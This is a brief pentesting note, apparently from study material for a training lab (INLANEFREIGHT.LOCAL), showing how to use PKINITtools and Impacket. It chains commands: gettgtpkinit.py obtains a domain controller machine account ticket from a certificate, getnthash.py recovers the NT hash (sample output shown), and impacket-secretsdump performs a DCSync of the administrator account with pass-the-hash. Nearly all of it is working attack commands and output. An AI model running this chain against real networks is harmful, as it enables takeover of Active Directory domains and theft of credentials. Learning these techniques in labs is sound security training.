# Example Usage
```shell-session
$ python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base64 Certificate> dc01.ccache
```
This will provide:
1. TGT file in `.ccache`
2. `AS-REP` key

The `AS-REP` key can be used to request NT Hash using [[getNThash]]:
```shell-session
$ python /opt/PKINITtools/getnthash.py -key <AS-REP-Key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```
And this NT hash can be used to perform DCSync attack using [[SecretsDump]]:
```shell-session
$ impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
